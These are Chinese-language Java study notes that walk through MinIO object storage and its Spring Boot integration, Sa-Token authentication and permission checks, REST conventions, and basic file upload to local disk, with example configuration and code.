MinlO是一个基于Apache License v2.0开源协议的对象存储服务它兼容亚马逊S3云存储服务接口，非常适合于存储大容量非结构化的数据，例如图片、视频、日志文件、备份数据和容器/虚拟机镜像等，而一个对象文件可以是任意大小，从几kb到最大5T不等。
MinlO是一个非常轻量的服务,可以很简单的和其他应用的结合，类似Node]S, Redis 或者MySQL。

[官网](http://www.minio.org.cn/)

#### 1.2 MiniO的基础概念

**object**:存储到Minio的基本对象，如文件、字节流，Anything...

**Bucket**:用来存储Object 的逻辑空间。每个 Bucket,之间的数据是相互隔离的。对于客户端而言，就相当于一个存放文件的顶层文件夹。|

**Drive**:即存储数据的磁盘，在Minlo启动时，以参数的方式传入。Minio中所有的对象数据都会存储在Drive里。

**Set**:即一组Drive的集合，分布式部署根据集群规模自动划分一个或多个Set ，每个Set中的Drive分布在不同位置。一个对象存储在一个set上。(For example:

{1...64} is divided into 4 sets each of size 16.)

- 一个对象存储在一个set上
- 一个集群划分为多个Set
- 一个set包含的Drive数量是固定的，默认由系统根据集群规模自动计算得出。一个SET中的Drive尽可能分布在不同的节点上

#### 1.3 纠删码EC

Minio使用纠删码机制来保证高可靠性，使用 highwayhash来处理数据损坏（Bit Rot Protection )。关于纠删码，简单来说就是可以通过数学计算，把丢失的数据进行还原，它可以将n份原始数据，增加m份数据，并能通过n+m份中的任意n份数据，还原为原始数据。即如果有任意小于等于m份的数据失效，仍然能通过剩下的数据还原出来。

#### 1.4 存储形式

文件对象上传到MinlO，会在对应的数据存储磁盘中，以Bucket名称为目录，文件名称为下一级目录，文件名下是part.1和xl.meta(老版本，最新版本如下图)，前者是编码数据块及检验块，后者是元数据文件。

####  1.5 存储方案

![image-20230913103238346](./img/小米虫爬山路-img/image-20230913103238346.png)

### 2、Java整合Minio

Minlo Java Client SDK提供简单的API来访问任何与Amazon S3兼容的对象存储服务。

官方demo: https://github.com/minio/minio-java

官方文档: https://docs.min.io/docs/java-client-api-reference.html

#### 2.1 开启服务

在单机上部署

在下载并安装minio后在minio.exe的目录下打开终端输入一下命令

```xml
minio server （minio存储数据的位置一般就是本当前地址）
```

出现如下图的提示就说明开启成功

![image-20230914100005680](./img/小米虫爬山路-img/image-20230914100005680.png)

```xml
其中 S3-API: http://10.202.129.16:9000    http://127.0.0.1:9000     这两个网址就是访问minio的接口地址
```

输入`http://127.0.0.1:9000`就可以访问minio的终端网站。



#### 2.1 创建Spring-Boot项目

![image-20230914154340227](./img/小米虫爬山路-img/image-20230914154340227.png)

![image-20230914154413844](./img/小米虫爬山路-img/image-20230914154413844.png)

选好Spring-Boot版本和自己添加的依赖项（根据需要添加）

#### 2.2 引入依赖

```xml
 <dependency>
    <groupId>io.minio</groupId>
    <artifactId>minio</artifactId>
    <version>8.5.1</version>
 </dependency>
```

#### 2.3 配置Minio

在.yml文件中配置Minio

```yml
#minio配置这里用客户端
minio:
  client:
    endpoint: http://127.0.0.1:9000 #Minio服务所在地址
    bucketName: test #存储桶名称
    accessKey: minioadmin #访问的key
    secretKey: minioadmin #访问的秘钥
    
    
#endpoint：是你启动的minio所指定的api接口地址。
#bucketName：就是我们的存储桶的名称。
#accessKey：就是我们的访问的key
#secretKey：就是我们的密钥。


#还可以设置一下前后端传输的数据内存大小
spring:
  servlet:
    multipart:
      max-file-size: 100MB
      max-request-size: 1000MB
      
#max-file-size：这个属性指定了单个文件的最大允许大小。在上述配置中，它被设置为100MB，这意味着任何尝试上传的单个文件的大小不得超过100MB。
#max-request-size：这个属性指定了整个文件上传请求的最大允许大小，包括所有上传的文件和其他请求数据。在上述配置中，它被设置为1000MB，这意味着整个文件上传请求的大小（包括所有文件）不得超过1000MB。
```



#### 2.3 添加配置类

```java
/**
 * @author 平
 *
 * @description: minio配置类
 */
@Data
@Configuration
@ConfigurationProperties(prefix = "minio.client")//此注解会把配置文件中minio.client写的配置自动注入下面对应字段中
public class MinioConfig {

    /**
     * api接口地址
     */
    private String endpoint;

    /**
     * 桶名字
     */
    private String bucketName;

    /**
     *key
     */
    private String accessKey;

    /**
     * 密钥
     */
    private String secretKey;

    /**
     * Minio客户端
     * @return
     */
    @Bean
    public MinioClient minioClient(){
        return MinioClient.builder()
                .endpoint(endpoint)
                .credentials(accessKey,secretKey)
                .build();
    }


}
```

#### 2.4 添加实体类

此类的作用是调用Minio服务时返回的是一个对象，对象里面封装一些文件的信息。

```java
/**
 * @author 平
 *
 * @description: 文件信息
 */
@Data
@NoArgsConstructor
@AllArgsConstructor
public class FileMessage {
    /**
     * 文件名
     */
    private String name;

    /**
     * 文件存储名称
     */
    private String objName;

    /**
     * 文件路径
     */
    private String path;

    /**
     * 获取文件资源路径
     */
    private String url;

    /**
     * 文件类型
     */
    private String type;

    /**
     * 文件大小
     */
    private Long size;
}
```

#### 2.5 服务类

接口

```java
/**
 * @author 平
 *
 * @description: Minio服务接口
 */
public interface MinioService {

    /**
     * 判断是否存在桶
     * 默认判断配置文件中的桶
     * @return 是否存在
     */
    Boolean isExistBucket();

    /**
     * 创建桶
     * 默认创建配置文件中的桶
     * @return 返回是否成功
     */
    Boolean createBucket();

    /**
     * 删除桶
     * 默认删除配置文件中的桶
     * @return 返回是否成功
     */
    Boolean deleteBucket();

    /**
     * 上传文件
     * @param file
     * @return
     */
    FileMessage putFile(MultipartFile file);

    /**
     * 批量上传文件
     * @param files
     * @return
     */
    List<FileMessage> putFiles(List<MultipartFile> files);

    /**
     * 得到文件流
     * 把minio中的文件传到java程序中
     * @param objectName 文件名称
     * @return
     */
    InputStream getFile(String objectName);

    /**
     * 下载文件
     * @param objectName
     * @param path 下载路径 （默认D:\\Image中）
     * @return 是否成功
     */
    Boolean download(String objectName,String path);

    /**
     * 删除文件
     * @param objectName
     */
    void deleteObject(String objectName);

    /**
     * 批量删除
     * @param objectNames
     */
    void deleteObjects(List<String> objectNames);

    /**
     * 获取文件url
     * 默认7天
     * @param objectName
     * @param time 时间 （单位：小时）
     * @return
     */
    String getObjectUrl(String objectName,Integer time);
}

```

实现

因为MinioClient的方法都会抛出错误，添加`@SneakyThrows`注解

```java
/**
 * @author 平
 * @description: Minio服务接口实现
 */
@Service
public class MinioServiceImpl implements MinioService {

    private final MinioClient minioClient;

    private final MinioConfig minioConfig;

    @Autowired
    public MinioServiceImpl(MinioClient minioClient, MinioConfig minioConfig) {
        this.minioClient = minioClient;
        this.minioConfig = minioConfig;
    }

    /**
     * 判断是否存在桶
     * 默认判断配置文件中的桶
     * @return
     */
    @Override
    @SneakyThrows
    public Boolean isExistBucket() {
        return minioClient.bucketExists(
                BucketExistsArgs
                        .builder()
                        .bucket(minioConfig.getBucketName())
                        .build());
    }

    /**
     * 创建桶
     * 默认创建配置文件中的桶
     */
    @Override
    @SneakyThrows
    public Boolean createBucket() {
        minioClient.makeBucket(
                MakeBucketArgs
                        .builder()
                        .bucket(minioConfig.getBucketName())
                        .build());

        return this.isExistBucket();
    }

    /**
     * 删除桶
     * 默认删除配置文件中的桶
     */
    @Override
    @SneakyThrows
    public Boolean deleteBucket() {
        minioClient.removeBucket(
                RemoveBucketArgs
                        .builder()
                        .bucket(minioConfig.getBucketName())
                        .build());
        return !this.isExistBucket();
    }

    /**
     * 上传文件
     * 上传文件并获得文件信息
     * @param file
     * @return
     */
    @Override
    @SneakyThrows
    public FileMessage putFile(MultipartFile file) {
        FileMessage fileMessage = new FileMessage();
        String name = file.getOriginalFilename();
        //使用uuid
        String uuid = UUID.randomUUID().toString().replace("-", "");
        String objName = uuid + "-" + name;
        String type = file.getContentType();
        long size = file.getSize();

        minioClient.putObject(
                PutObjectArgs
                        .builder()
                        .bucket(minioConfig.getBucketName())
                        .object(objName)
                        .stream(file.getInputStream(), size, -1)
                        .contentType(type)
                        .build());

        String url = this.getObjectUrl(objName, null);
        String path = url.substring(0, url.indexOf("?"));

        fileMessage.setName(name);
        fileMessage.setObjName(objName);
        fileMessage.setType(type);
        fileMessage.setSize(size);
        fileMessage.setUrl(url);
        fileMessage.setPath(path);
        return fileMessage;
    }

    /**
     * 批量上传文件
     * @param files
     * @return
     */
    @Override
    public List<FileMessage> putFiles(List<MultipartFile> files) {
        List<FileMessage> fileMessages = new ArrayList<>();
        if (!Objects.isNull(files) && !files.isEmpty()) {
            files.forEach(file ->
                    fileMessages.add(this.putFile(file))
            );
        }
        return fileMessages;
    }

    /**
     * 得到文件流
     * 把minio中的文件传到java程序中
     * @param objectName 文件名称
     * @return
     */
    @Override
    @SneakyThrows
    public InputStream getFile(String objectName) {
        return minioClient.getObject(
                GetObjectArgs
                        .builder()
                        .bucket(minioConfig.getBucketName())
                        .object(objectName)
                        .build());
    }

    /**
     * 下载文件
     * @param objectName
     * @param path 下载路径 （默认D:\\Image中）
     * @return 是否成功
     */
    @Override
    @SneakyThrows
    public Boolean download(String objectName, String path) {
        if(Objects.isNull(path) || "".equals(path))
            path = "D:\\Image";

        if(!new File(path).exists())
            Files.createDirectories(Path.of(path));

        path = path + "\\" + objectName;

        minioClient.downloadObject(
                DownloadObjectArgs.builder()
                        .bucket(minioConfig.getBucketName())
                        .object(objectName)
                        .filename(path)
                        .build());

        return new File(path).exists();

    }

    /**
     * 删除文件
     * @param objectName
     */
    @Override
    @SneakyThrows
    public void deleteObject(String objectName) {
        minioClient.removeObject(
                RemoveObjectArgs
                        .builder()
                        .bucket(minioConfig.getBucketName())
                        .object(objectName)
                        .build());
    }

    /**
     * 批量删除
     * @param objectNames
     */
    @Override
    @SneakyThrows
    public void deleteObjects(List<String> objectNames) {
        List<DeleteObject> objects = new LinkedList<>();
        objectNames.forEach(objectName ->
                objects.add(new DeleteObject(objectName))
        );

        Iterable<Result<DeleteError>> results =
                minioClient.removeObjects(
                        RemoveObjectsArgs
                                .builder()
                                .bucket(minioConfig.getBucketName())
                                .objects(objects)
                                .build());

        for (Result<DeleteError> result : results) {
            DeleteError error = result.get();
            System.out.println(
                    "删除失败 " + error.objectName() + "\n错误原因 " + error.message());
        }
    }

    /**
     * 获取文件url
     * 默认有效期7天
     * @param objectName
     * @param time       时间 （单位：天）
     * @return
     */
    @Override
    @SneakyThrows
    public String getObjectUrl(String objectName, Integer time) {
        if (Objects.isNull(time))
            time = 7;
        return minioClient.getPresignedObjectUrl(
                GetPresignedObjectUrlArgs.builder()
                        .method(Method.GET)
                        .bucket(minioConfig.getBucketName())
                        .object(objectName)
                        .expiry(time, TimeUnit.DAYS)
                        .build());
    }
}

```

下面是官方整合的教程其中还有一些其他的minio操作方法。

[官方教程](https://min.io/docs/minio/linux/developers/java/API.html?ref=docs-redirect#getPresignedObjectUrl)

![image-20230914200747008](./img/小米虫爬山路-img/image-20230914200747008.png)

剩余就是测试，这里不演示。



## 十四、Sa-Token

### 1、开始

结合Spring-boot

#### 1.1 创建项目

在 IDE 中新建一个 SpringBoot 项目，例如：`sa-token-demo-springboot`（不会的同学请自行百度或者参考：[SpringBoot-Pure](https://gitee.com/click33/springboot-pure)）

#### 1.2 添加依赖

在项目中添加依赖：

注：如果你使用的是 SpringBoot 3.x，只需要将 `sa-token-spring-boot-starter` 修改为 `sa-token-spring-boot3-starter` 即可。

```xml
<!-- Sa-Token 权限认证，在线文档：https://sa-token.cc -->
<dependency>
    <groupId>cn.dev33</groupId>
    <artifactId>sa-token-spring-boot-starter</artifactId>
    <version>1.37.0</version>
</dependency>
```

#### 1.3 设置配置文件

你可以**零配置启动项目** ，但同时你也可以在 `application.yml` 中增加如下配置，定制性使用框架：

```yaml
server:
    # 端口
    port: 8081
    
############## Sa-Token 配置 (文档: https://sa-token.cc) ##############
sa-token: 
    # token 名称（同时也是 cookie 名称）
    token-name: satoken
    # token 有效期（单位：秒） 默认30天，-1 代表永久有效
    timeout: 2592000
    # token 最低活跃频率（单位：秒），如果 token 超过此时间没有访问系统就会被冻结，默认-1 代表不限制，永不冻结
    active-timeout: -1
    # 是否允许同一账号多地同时登录 （为 true 时允许一起登录, 为 false 时新登录挤掉旧登录）
    is-concurrent: true
    # 在多人登录同一账号时，是否共用一个 token （为 true 时所有登录共用一个 token, 为 false 时每次登录新建一个 token）
    is-share: true
    # token 风格（默认可取值：uuid、simple-uuid、random-32、random-64、random-128、tik）
    token-style: uuid
    # 是否输出操作日志 
    is-log: true
```

#### 1.4 创建启动类

```java
@SpringBootApplication
public class SaTokenDemoApplication {
    public static void main(String[] args) throws JsonProcessingException {
        SpringApplication.run(SaTokenDemoApplication.class, args);
        System.out.println("启动成功，Sa-Token 配置如下：" + SaManager.getConfig());
    }
}
```

#### 1.5 创建测试Controller

```java
@RestController
@RequestMapping("/user/")
public class UserController {

    // 测试登录，浏览器访问： http://localhost:8081/user/doLogin?username=zhang&password=123456
    @RequestMapping("doLogin")
    public String doLogin(String username, String password) {
        // 此处仅作模拟示例，真实项目需要从数据库中查询数据进行比对 
        if("zhang".equals(username) && "123456".equals(password)) {
            StpUtil.login(10001);
            return "登录成功";
        }
        return "登录失败";
    }

    // 查询登录状态，浏览器访问： http://localhost:8081/user/isLogin
    @RequestMapping("isLogin")
    public String isLogin() {
        return "当前会话是否登录：" + StpUtil.isLogin();
    }
    
}
```

#### 1.6 运行

启动代码，从浏览器依次访问上述测试接口：

![运行结果](./img/小米虫爬山路-img/test-do-login.png)

![运行结果](./img/小米虫爬山路-img/test-is-login.png)

### 2、基础

#### 2.1 登录认证

##### 2.1.1 设计思路

对于一些登录之后才能访问的接口（例如：查询我的账号资料），我们通常的做法是增加一层接口校验：

- 如果校验通过，则：正常返回数据。
- 如果校验未通过，则：抛出异常，告知其需要先进行登录。

那么，判断会话是否登录的依据是什么？我们先来简单分析一下登录访问流程：

1. 用户提交 `name` + `password` 参数，调用登录接口。
2. 登录成功，返回这个用户的 Token 会话凭证。
3. 用户后续的每次请求，都携带上这个 Token。
4. 服务器根据 Token 判断此会话是否登录成功。

所谓登录认证，指的就是服务器校验账号密码，为用户颁发 Token 会话凭证的过程，这个 Token 也是我们后续判断会话是否登录的关键所在。

##### 2.1.2 登录与注销

根据以上思路，我们需要一个会话登录的函数：

```java
// 会话登录：参数填写要登录的账号id，建议的数据类型：long | int | String， 不可以传入复杂类型，如：User、Admin 等等
StpUtil.login(Object id);     
```

只此一句代码，便可以使会话登录成功，实际上，Sa-Token 在背后做了大量的工作，包括但不限于：

1. 检查此账号是否之前已有登录；
2. 为账号生成 `Token` 凭证与 `Session` 会话；
3. 记录 Token 活跃时间；
4. 通知全局侦听器，xx 账号登录成功；
5. 将 `Token` 注入到请求上下文；
6. 等等其它工作……

你暂时不需要完整了解整个登录过程，你只需要记住关键一点：`Sa-Token 为这个账号创建了一个Token凭证，且通过 Cookie 上下文返回给了前端`。

所以一般情况下，我们的登录接口代码，会大致类似如下：

```java
// 会话登录接口 
@RequestMapping("doLogin")
public SaResult doLogin(String name, String pwd) {
    // 第一步：比对前端提交的账号名称、密码
    if("zhang".equals(name) && "123456".equals(pwd)) {
        // 第二步：根据账号id，进行登录 
        StpUtil.login(10001);
        return SaResult.ok("登录成功");
    }
    return SaResult.error("登录失败");
}
```

如果你对以上代码阅读没有压力，你可能会注意到略显奇怪的一点：此处仅仅做了会话登录，但并没有主动向前端返回 token 信息。 是因为不需要吗？严格来讲是需要的，只不过 `StpUtil.login(id)` 方法利用了 Cookie 自动注入的特性，省略了你手写返回 token 的代码。

如果你对 Cookie 功能还不太了解，也不用担心，我们会在之后的 [ 前后端分离 ] 章节中详细的阐述 Cookie 功能，现在你只需要了解最基本的两点：

- Cookie 可以从后端控制往浏览器中写入 token 值。
- Cookie 会在前端每次发起请求时自动提交 token 值。

因此，在 Cookie 功能的加持下，我们可以仅靠 `StpUtil.login(id)` 一句代码就完成登录认证。

除了登录方法，我们还需要：

```java
// 当前会话注销登录
StpUtil.logout();

// 获取当前会话是否已经登录，返回true=已登录，false=未登录
StpUtil.isLogin();

// 检验当前会话是否已经登录, 如果未登录，则抛出异常：`NotLoginException`
StpUtil.checkLogin();
```

异常 `NotLoginException` 代表当前会话暂未登录，可能的原因有很多： 前端没有提交 token、前端提交的 token 是无效的、前端提交的 token 已经过期 …… 等等，可参照此篇：[未登录场景值](https://sa-token.cc/doc.html#/fun/not-login-scene)，了解如何获取未登录的场景值。

##### 2.1.3 会话查询

```java
// 获取当前会话账号id, 如果未登录，则抛出异常：`NotLoginException`
StpUtil.getLoginId();

// 类似查询API还有：
StpUtil.getLoginIdAsString();    // 获取当前会话账号id, 并转化为`String`类型
StpUtil.getLoginIdAsInt();       // 获取当前会话账号id, 并转化为`int`类型
StpUtil.getLoginIdAsLong();      // 获取当前会话账号id, 并转化为`long`类型

// ---------- 指定未登录情形下返回的默认值 ----------

// 获取当前会话账号id, 如果未登录，则返回 null 
StpUtil.getLoginIdDefaultNull();

// 获取当前会话账号id, 如果未登录，则返回默认值 （`defaultValue`可以为任意类型）
StpUtil.getLoginId(T defaultValue);
```

##### 2.1.4 token查询

```java
// 获取当前会话的 token 值
StpUtil.getTokenValue();

// 获取当前`StpLogic`的 token 名称
StpUtil.getTokenName();

// 获取指定 token 对应的账号id，如果未登录，则返回 null
StpUtil.getLoginIdByToken(String tokenValue);

// 获取当前会话剩余有效期（单位：s，返回-1代表永久有效）
StpUtil.getTokenTimeout();

// 获取当前会话的 token 信息参数
StpUtil.getTokenInfo();
```

##### 2.1.5 示例

```java
/**
 * 登录测试 
 */
@RestController
@RequestMapping("/acc/")
public class LoginController {

    // 测试登录  ---- http://localhost:8081/acc/doLogin?name=zhang&pwd=123456
    @RequestMapping("doLogin")
    public SaResult doLogin(String name, String pwd) {
        // 此处仅作模拟示例，真实项目需要从数据库中查询数据进行比对 
        if("zhang".equals(name) && "123456".equals(pwd)) {
            StpUtil.login(10001);
            return SaResult.ok("登录成功");
        }
        return SaResult.error("登录失败");
    }

    // 查询登录状态  ---- http://localhost:8081/acc/isLogin
    @RequestMapping("isLogin")
    public SaResult isLogin() {
        return SaResult.ok("是否登录：" + StpUtil.isLogin());
    }
    
    // 查询 Token 信息  ---- http://localhost:8081/acc/tokenInfo
    @RequestMapping("tokenInfo")
    public SaResult tokenInfo() {
        return SaResult.data(StpUtil.getTokenInfo());
    }
    
    // 测试注销  ---- http://localhost:8081/acc/logout
    @RequestMapping("logout")
    public SaResult logout() {
        StpUtil.logout();
        return SaResult.ok();
    }
}
```

#### 2.2 权限认证

##### 2.2.1 设计思路

所谓权限认证，核心逻辑就是判断一个账号是否拥有指定权限：

- 有，就让你通过。
- 没有？那么禁止访问！

深入到底层数据中，就是每个账号都会拥有一组权限码集合，框架来校验这个集合中是否包含指定的权限码。

例如：当前账号拥有权限码集合 `["user-add", "user-delete", "user-get"]`，这时候我来校验权限 `"user-update"`，则其结果就是：**验证失败，禁止访问**。



所以现在问题的核心就是两个：

1. 如何获取一个账号所拥有的权限码集合？
2. 本次操作需要验证的权限码是哪个？

##### 2.2.2 获取当前账户权限码集合

因为每个项目的需求不同，其权限设计也千变万化，因此 [ 获取当前账号权限码集合 ] 这一操作不可能内置到框架中， 所以 Sa-Token 将此操作以接口的方式暴露给你，以方便你根据自己的业务逻辑进行重写。

你需要做的就是新建一个类，实现 `StpInterface`接口，例如以下代码：

```java
/**
 * 自定义权限加载接口实现类
 */
@Component    // 保证此类被 SpringBoot 扫描，完成 Sa-Token 的自定义权限验证扩展 
public class StpInterfaceImpl implements StpInterface {

    /**
     * 返回一个账号所拥有的权限码集合 
     */
    @Override
    public List<String> getPermissionList(Object loginId, String loginType) {
        // 本 list 仅做模拟，实际项目中要根据具体业务逻辑来查询权限
        List<String> list = new ArrayList<String>();    
        list.add("101");
        list.add("user.add");
        list.add("user.update");
        list.add("user.get");
        // list.add("user.delete");
        list.add("art.*");
        return list;
    }

    /**
     * 返回一个账号所拥有的角色标识集合 (权限与角色可分开校验)
     */
    @Override
    public List<String> getRoleList(Object loginId, String loginType) {
        // 本 list 仅做模拟，实际项目中要根据具体业务逻辑来查询角色
        List<String> list = new ArrayList<String>();    
        list.add("admin");
        list.add("super-admin");
        return list;
    }

}
```

**参数解释：**

- loginId：账号id，即你在调用 `StpUtil.login(id)` 时写入的标识值。
- loginType：账号体系标识，此处可以暂时忽略，在 [ 多账户认证 ] 章节下会对这个概念做详细的解释。

有同学会产生疑问：我实现了此接口，但是程序启动时好像并没有执行，是不是我写错了？ 答：不执行是正常现象，程序启动时不会执行这个接口的方法，在每次调用鉴权代码时，才会执行到此。

##### 2.2.3 权限校验

然后就可以用以下 api 来鉴权了

```java
// 获取：当前账号所拥有的权限集合
StpUtil.getPermissionList();

// 判断：当前账号是否含有指定权限, 返回 true 或 false
StpUtil.hasPermission("user.add");        

// 校验：当前账号是否含有指定权限, 如果验证未通过，则抛出异常: NotPermissionException 
StpUtil.checkPermission("user.add");        

// 校验：当前账号是否含有指定权限 [指定多个，必须全部验证通过]
StpUtil.checkPermissionAnd("user.add", "user.delete", "user.get");        

// 校验：当前账号是否含有指定权限 [指定多个，只要其一验证通过即可]
StpUtil.checkPermissionOr("user.add", "user.delete", "user.get");    
```

扩展：`NotPermissionException` 对象可通过 `getLoginType()` 方法获取具体是哪个 `StpLogic` 抛出的异常

##### 2.2.4 角色校验

在 Sa-Token 中，角色和权限可以分开独立验证

```java
// 获取：当前账号所拥有的角色集合
StpUtil.getRoleList();

// 判断：当前账号是否拥有指定角色, 返回 true 或 false
StpUtil.hasRole("super-admin");        

// 校验：当前账号是否含有指定角色标识, 如果验证未通过，则抛出异常: NotRoleException
StpUtil.checkRole("super-admin");        

// 校验：当前账号是否含有指定角色标识 [指定多个，必须全部验证通过]
StpUtil.checkRoleAnd("super-admin", "shop-admin");        

// 校验：当前账号是否含有指定角色标识 [指定多个，只要其一验证通过即可] 
StpUtil.checkRoleOr("super-admin", "shop-admin");        
```

扩展：`NotRoleException` 对象可通过 `getLoginType()` 方法获取具体是哪个 `StpLogic` 抛出的异常

##### 2.2.5 拦截全局异常

有同学要问，鉴权失败，抛出异常，然后呢？要把异常显示给用户看吗？**当然不可以！**

你可以创建一个全局异常拦截器，统一返回给前端的格式，参考：

```java
@RestControllerAdvice
public class GlobalExceptionHandler {
    // 全局异常拦截 
    @ExceptionHandler
    public SaResult handlerException(Exception e) {
        e.printStackTrace(); 
        return SaResult.error(e.getMessage());
    }
}
```

##### 2.2.6 权限通配符

Sa-Token允许你根据通配符指定**泛权限**，例如当一个账号拥有`art.*`的权限时，`art.add`、`art.delete`、`art.update`都将匹配通过

```java
// 当拥有 art.* 权限时
StpUtil.hasPermission("art.add");        // true
StpUtil.hasPermission("art.update");     // true
StpUtil.hasPermission("goods.add");      // false

// 当拥有 *.delete 权限时
StpUtil.hasPermission("art.delete");      // true
StpUtil.hasPermission("user.delete");     // true
StpUtil.hasPermission("user.update");     // false

// 当拥有 *.js 权限时
StpUtil.hasPermission("index.js");        // true
StpUtil.hasPermission("index.css");       // false
StpUtil.hasPermission("index.html");      // false
```

上帝权限：当一个账号拥有 `"*"` 权限时，他可以验证通过任何权限码 （角色认证同理）

##### 2.2.7 如何把权限精确到按钮级

权限精确到按钮级的意思就是指：**权限范围可以控制到页面上的每一个按钮是否显示**。

思路：如此精确的范围控制只依赖后端已经难以完成，此时需要前端进行一定的逻辑判断。

如果是前后端一体项目，可以参考：[Thymeleaf 标签方言](https://sa-token.cc/doc.html#/plugin/thymeleaf-extend)，如果是前后端分离项目，则：

1. 在登录时，把当前账号拥有的所有权限码一次性返回给前端。

2. 前端将权限码集合保存在`localStorage`或其它全局状态管理对象中。

3. 在需要权限控制的按钮上，使用 js 进行逻辑判断，例如在Vue框架中我们可以使用如下写法：

   ```js
   <button v-if="arr.indexOf('user.delete') > -1">删除按钮</button>
   ```

   其中：arr是当前用户拥有的权限码数组，user.delete是显示按钮需要拥有的权限码，删除按钮是用户拥有权限码才可以看到的内容。

注意：以上写法只为提供一个参考示例，不同框架有不同写法，大家可根据项目技术栈灵活封装进行调用。

##### 2.2.8 前端有了鉴权后端还需要鉴权吗

**需要！**

前端的鉴权只是一个辅助功能，对于专业人员这些限制都是可以轻松绕过的， 为保证服务器安全，**无论前端是否进行了权限校验，后端接口都需要对会话请求再次进行权限校验**



























## 十wu、开发

### 1、开发流程

做开发时要基于以下步骤开发：

**开发流程**

我们在进行功能开发时，都是根据如下流程进行：

![image-20220904125004138](D:\学习\java语言程序设计\java笔记\image-20220904125004138.png) 

1. 查看页面原型明确需求
   - 根据页面原型和需求，进行表结构设计、编写接口文档(已提供)

2. 阅读接口文档
3. 思路分析
4. 功能接口开发
   - 就是开发后台的业务功能，一个业务功能，我们称为一个接口
5. 功能接口测试
   - 功能开发完毕后，先通过Postman进行功能接口测试，测试通过后，再和前端进行联调测试
6. 前后端联调测试
   - 和前端开发人员开发好的前端工程一起测试

### 2、REST风格

* ==REST==（Representational State Transfer），表现形式状态转换,它是一种软件架构==风格==

  当我们想表示一个网络资源的时候，可以使用两种方式:

  * 传统风格资源描述形式
    * `http://localhost/user/getById?id=1` 查询id为1的用户信息
    * `http://localhost/user/saveUser` 保存用户信息
  * REST风格描述形式
    * `http://localhost/user/1` 
    * `http://localhost/user`

传统方式一般是一个请求url对应一种操作，这样做不仅麻烦，也不安全，因为会程序的人读取了你的请求url地址，就大概知道该url实现的是一个什么样的操作。

查看REST风格的描述，你会发现请求地址变的简单了，并且光看请求URL并不是很能猜出来该URL的具体功能

所以REST的优点有:

- 隐藏资源的访问行为，无法通过地址得知对资源是何种操作
- 书写简化

但是我们的问题也随之而来了，一个相同的url地址即可以是新增也可以是修改或者查询，那么到底我们该如何区分该请求到底是什么操作呢?

* 按照REST风格访问资源时使用==行为动作==区分对资源进行了何种操作
  * `http://localhost/users`	查询全部用户信息 GET（查询）
  * `http://localhost/users/1`  查询指定用户信息 GET（查询）
  * `http://localhost/users`    添加用户信息    POST（新增/保存）
  * `http://localhost/users`    修改用户信息    PUT（修改/更新）
  * `http://localhost/users/1`  删除用户信息    DELETE（删除）

请求的方式比较多，但是比较常用的就4种，分别是`GET`,`POST`,`PUT`,`DELETE`。

按照不同的请求方式代表不同的操作类型。

* 发送GET请求是用来做查询
* 发送POST请求是用来做新增
* 发送PUT请求是用来做修改
* 发送DELETE请求是用来做删除

但是==注意==:

* 上述行为是约定方式，约定不是规范，可以打破，所以称REST风格，而不是REST规范
  * REST提供了对应的架构方式，按照这种架构设计项目可以降低开发的复杂性，提高系统的可伸缩性
  * REST中规定GET/POST/PUT/DELETE针对的是查询/新增/修改/删除，但是我们如果非要用GET请求做删除，这点在程序上运行是可以实现的
  * 但是如果绝大多数人都遵循这种风格，你写的代码让别人读起来就有点莫名其妙了。
* 描述模块的名称通常使用复数，也就是加s的格式描述，表示此类资源，而非单个资源，例如:users、books、accounts......

清楚了什么是REST风格后，我们后期会经常提到一个概念叫`RESTful`，那什么又是RESTful呢?

* 根据REST风格对资源进行访问称为==RESTful==。

后期我们在进行开发的过程中，大多是都是遵从REST风格来访问我们的后台服务，所以可以说咱们以后都是基于RESTful来进行开发的。

### 3、文件上传

#### 3.1 简介

文件上传，是指将本地图片、视频、音频等文件上传到服务器，供其他用户浏览或下载的过程。

文件上传在项目中应用非常广泛，我们经常发微博、发微信朋友圈都用到了文件上传功能。

![image-20230810163006563](./img/小米虫爬山路-img/image-20230810163006563.png)

想要完成文件上传这个功能需要涉及到两个部分：

1. 前端程序
2. 服务端程序



我们先来看看在前端程序中要完成哪些代码：

```html
<form action="/upload" method="post" enctype="multipart/form-data"><!-- action属性里面放的是请求的路径-->
	姓名: <input type="text" name="username"><br>
    年龄: <input type="text" name="age"><br>
    头像: <input type="file" name="image"><br>
    <input type="submit" value="提交">
</form>
```

上传文件的原始form表单，要求表单必须具备以下三点（上传文件页面三要素）：

- 表单必须有file域，用于选择要上传的文件

  > ~~~html
  > <input type="file" name="image"/>
  > ~~~

- 表单提交方式必须为POST

  > 通常上传的文件会比较大，所以需要使用 POST 提交方式

- 表单的编码类型enctype必须要设置为：multipart/form-data

  > 普通默认的编码格式是不适合传输大型的二进制数据的，所以在文件上传时，表单的编码格式必须设置为multipart/form-data

知道了前端程序中需要设置上传文件页面三要素，那我们的后端程序又是如何实现的呢？

- 首先在服务端定义这么一个controller，用来进行文件上传，然后在controller当中定义一个方法来处理`/upload` 请求

- 在定义的方法中接收提交过来的数据 （方法中的形参名和请求参数的名字保持一致）

  - 用户名：String  name
  - 年龄： Integer  age
  - 文件： MultipartFile  image

  > Spring中提供了一个API：MultipartFile，使用这个API就可以来接收到上传的文件

![image-20221216215930807](./img/小米虫爬山路-img/image-20221216215930807.png)

==提示：在程序运行时我们从表单得到的文件会储存在电脑中的某路径下成为临时文件，当我们程序运行完毕之后，这个临时文件会自动删除。 所以，我们如果想要实现文件上传，需要将这个临时文件，要转存到我们的磁盘目录中。==

#### 3.2 本地存储

前面我们已分析了文件上传功能前端和后端的基础代码实现，文件上传时在服务端会产生一个临时文件，请求响应完成之后，这个临时文件被自动删除，并没有进行保存。下面呢，我们就需要完成将上传的文件保存在服务器的本地磁盘上。

代码实现：

1. 在服务器本地磁盘上创建images目录，用来存储上传的文件（例：E盘创建images目录）
2. 使用MultipartFile类提供的API方法，把临时文件转存到本地磁盘目录下

> MultipartFile 常见方法： 
>
> - String  getOriginalFilename();  //获取原始文件名
> - void  transferTo(File dest);     //将接收的文件转存到磁盘文件中
> - long  getSize();     //获取文件的大小，单位：字节
> - byte[]  getBytes();    //获取文件内容的字节数组
> - InputStream  getInputStream();    //获取接收到的文件内容的输入流

```java
@Slf4j
@RestController
public class UploadController {

    @PostMapping("/upload")
    public Result upload(String username, Integer age, MultipartFile image) throws IOException {
        log.info("文件上传：{},{},{}",username,age,image);

        //获取原始文件名
        String originalFilename = image.getOriginalFilename();

        //将文件存储在服务器的磁盘目录
        image.transferTo(new File("E:/images/"+originalFilename));

        return Result.success();
    }

}
